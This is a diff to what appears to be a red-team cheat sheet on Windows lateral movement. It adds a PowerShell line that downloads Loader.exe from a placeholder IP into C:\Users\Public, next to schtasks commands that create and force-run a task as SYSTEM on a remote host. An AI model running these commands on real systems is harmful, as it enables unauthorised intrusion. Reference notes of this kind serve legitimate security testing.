@@ -6,6 +6,7 @@
 - [WinRS.exe](#winrsexe)
 - [Loader.exe](#loaderexe)
 - [Task Scheduling](#task-scheduling)
+- [File Copy Using Powershell](#file-copy-using-powershell)
 - [BloodHound](#bloodhound)
 
 
@@ -102,6 +103,11 @@ C:> schtasks /create /S <host> /SC Weekly /RU "NT Authority\SYSTEM" /TN "<task_n
 
 # Force task to run
 C:> schtasks /Run /S <host_fqdn> /TN "<task_name>"
+```
+### File Copy Using Powershell
+```powershell
+# From a URL to a file
+C:> iwr http://<IP>/Loader.exe -OutFile C:\Users\Public\Loader.exe
 ```
 ### BloodHound
 ---
